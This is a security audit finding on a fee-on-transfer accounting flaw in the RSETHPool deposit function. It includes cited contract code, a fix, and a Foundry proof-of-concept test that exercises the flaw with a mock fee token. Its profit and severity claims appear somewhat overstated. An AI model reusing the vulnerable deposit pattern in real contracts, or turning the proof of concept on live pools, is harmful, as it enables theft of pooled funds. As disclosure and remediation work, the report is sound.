### Title
Fee-on-Transfer Token Accounting Mismatch Allows Theft of wrsETH Reserves — (`contracts/pools/RSETHPool.sol`)

---

### Summary

`deposit(address,uint256,string)` computes the wrsETH payout using the caller-supplied `amount` parameter rather than the tokens actually received by the pool. When a fee-on-transfer token is used as collateral, the pool receives fewer tokens than `amount` but pays out wrsETH as if it received the full `amount`, draining wrsETH reserves proportional to the transfer fee.

---

### Finding Description

The vulnerable sequence in `deposit(address token, uint256 amount, string memory referralId)`:

```
Line 296: IERC20(token).safeTransferFrom(msg.sender, address(this), amount);
Line 298: (uint256 rsETHAmount, uint256 fee) = viewSwapRsETHAmountAndFee(amount, token);
Line 302: IERC20(address(wrsETH)).safeTransfer(msg.sender, rsETHAmount);
``` [1](#0-0) 

Step 1 transfers `amount` from the caller; for a fee-on-transfer token the pool actually receives `amount × (1 − fee_rate)`. Step 2 passes the original `amount` — not the actual received balance — to `viewSwapRsETHAmountAndFee`, which computes:

```
fee      = amount × tokenFeeBps / 10_000
amountAfterFee = amount − fee
rsETHAmount = amountAfterFee × tokenToETHRate / rsETHToETHrate
``` [2](#0-1) 

The pool then transfers `rsETHAmount` of wrsETH (line 302) computed on the inflated `amount`, while it only holds `amount × (1 − transfer_fee_rate)` of the collateral token. There is no balance-before/balance-after check anywhere in the function.

The `addSupportedToken` function (line 637) accepts any token address with a valid oracle and a non-zero `getRate()`. It performs no check that the token is free of transfer fees. [3](#0-2) 

---

### Impact Explanation

**Critical — Direct theft of wrsETH at rest in the pool.**

For every deposit of a fee-on-transfer token with fee rate `f`:
- Pool receives: `amount × (1 − f)` tokens
- Pool pays out: wrsETH equivalent to `amount × (1 − poolFeeBps/10000)` tokens

The attacker extracts wrsETH worth `amount × f × tokenToETHRate / rsETHToETHrate` more than the ETH-equivalent of collateral actually deposited. Repeated deposits drain the pool's wrsETH reserves entirely.

---

### Likelihood Explanation

**Precondition**: A fee-on-transfer token must be added via `addSupportedToken` (requires `TIMELOCK_ROLE`). This is a legitimate admin action — not a compromise — and could occur if:
- A token with a configurable fee (e.g., PAXG, STA, or a rebasing token) is added
- A token's fee is activated after it is already listed

Once the precondition is met, any unprivileged address can exploit this with a single `deposit` call. No front-running, flash loans, or special permissions are required.

---

### Recommendation

Measure the actual received balance using a before/after pattern:

```solidity
uint256 balanceBefore = IERC20(token).balanceOf(address(this));
IERC20(token).safeTransferFrom(msg.sender, address(this), amount);
uint256 actualReceived = IERC20(token).balanceOf(address(this)) - balanceBefore;

(uint256 rsETHAmount, uint256 fee) = viewSwapRsETHAmountAndFee(actualReceived, token);
feeEarnedInToken[token] += fee;
IERC20(address(wrsETH)).safeTransfer(msg.sender, rsETHAmount);
```

Alternatively, explicitly document and enforce (via `addSupportedToken`) that fee-on-transfer tokens are not supported.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

// MockFeeOnTransferToken: 1% fee on every transfer
contract MockFeeOnTransferToken is ERC20 {
    constructor() ERC20("FOT", "FOT") { _mint(msg.sender, 1000e18); }
    function _transfer(address from, address to, uint256 amount) internal override {
        uint256 fee = amount / 100; // 1%
        super._transfer(from, address(0xdead), fee);
        super._transfer(from, to, amount - fee);
    }
}

// Test (Foundry):
function testFeeOnTransferTheft() public {
    MockFeeOnTransferToken fot = new MockFeeOnTransferToken();
    MockOracle oracle = new MockOracle(1e18); // 1:1 with ETH

    // Admin adds the fee-on-transfer token
    vm.prank(timelockAdmin);
    pool.addSupportedToken(address(fot), address(oracle), address(bridge));

    // Attacker deposits 1e18 FOT
    fot.approve(address(pool), 1e18);
    uint256 wrsETHBefore = wrsETH.balanceOf(attacker);
    pool.deposit(address(fot), 1e18, "");
    uint256 wrsETHReceived = wrsETH.balanceOf(attacker) - wrsETHBefore;

    // Pool actually received 0.99e18 FOT, but paid wrsETH for 1e18
    uint256 fotInPool = fot.balanceOf(address(pool));
    assertEq(fotInPool, 0.99e18);           // pool holds 0.99e18 FOT
    // wrsETHReceived corresponds to 1e18 FOT worth of ETH — attacker profits ~1%
    assertGt(wrsETHReceived, fotInPool * 1e18 / oracle.getRate());
}
```

### Citations

**File:** contracts/pools/RSETHPool.sol (L296-302)
```text
        IERC20(token).safeTransferFrom(msg.sender, address(this), amount);

        (uint256 rsETHAmount, uint256 fee) = viewSwapRsETHAmountAndFee(amount, token);

        feeEarnedInToken[token] += fee;

        IERC20(address(wrsETH)).safeTransfer(msg.sender, rsETHAmount);
```

**File:** contracts/pools/RSETHPool.sol (L335-346)
```text
        uint256 feeBpsForToken = tokenFeeBps[token];
        fee = amount * feeBpsForToken / 10_000;
        uint256 amountAfterFee = amount - fee;

        // rate of rsETH in ETH
        uint256 rsETHToETHrate = getRate();

        // rate of token in ETH
        uint256 tokenToETHRate = IOracle(supportedTokenOracle[token]).getRate();

        // Calculate the final rsETH amount
        rsETHAmount = amountAfterFee * tokenToETHRate / rsETHToETHrate;
```

**File:** contracts/pools/RSETHPool.sol (L637-655)
```text
    function addSupportedToken(address token, address oracle, address bridge) external onlyRole(TIMELOCK_ROLE) {
        UtilLib.checkNonZeroAddress(token);
        UtilLib.checkNonZeroAddress(oracle);
        UtilLib.checkNonZeroAddress(bridge);

        if (supportedTokenOracle[token] != address(0)) {
            revert AlreadySupportedToken();
        }
        if (tokenBridge[token] != address(0)) {
            revert AlreadySupportedToken();
        }
        if (IOracle(oracle).getRate() == 0) {
            revert UnsupportedOracle();
        }
        supportedTokenList.push(token);
        supportedTokenOracle[token] = oracle;
        tokenBridge[token] = bridge;

        emit AddSupportedToken(token, oracle, bridge);
```
